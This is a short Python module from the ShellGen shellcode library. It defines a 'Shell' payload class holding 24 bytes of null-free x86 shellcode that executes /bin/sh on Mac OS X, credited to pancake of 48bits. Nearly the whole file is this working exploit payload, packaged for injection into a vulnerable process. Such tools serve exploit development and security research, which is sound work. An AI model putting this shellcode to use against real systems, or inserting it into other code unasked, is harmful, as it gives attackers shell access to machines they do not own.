#!/usr/bin/env python

###############################################################################
## Execute /bin/sh in MacOSX/x86                                             ##
## Shellcode for ShellGen                                                    ##
## Based on original code by pancake from 48bits                             ##
## http://radare.org/y/                                                      ##
###############################################################################

# Copyright (c) 2012-2015 Mario Vilas, pancake
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.

"Execute /bin/sh."

__all__ = ["Shell"]

from shellgen import Static

class Shell (Static):
    """
    Execute /bin/sh in MacOSX/x86.

    Based on original code by pancake from 48bits:
    U{http://radare.org/y/}
    """

    qualities = "payload"
    encoding  = "nullfree"

    bytes = (
        "\x99\x52\x68\x2f\x2f\x73\x68\x68"
        "\x2f\x62\x69\x6e\x89\xe3\x52\x54"
        "\x54\x53\x53\x8d\x42\x3b\xcd\x80"
    )
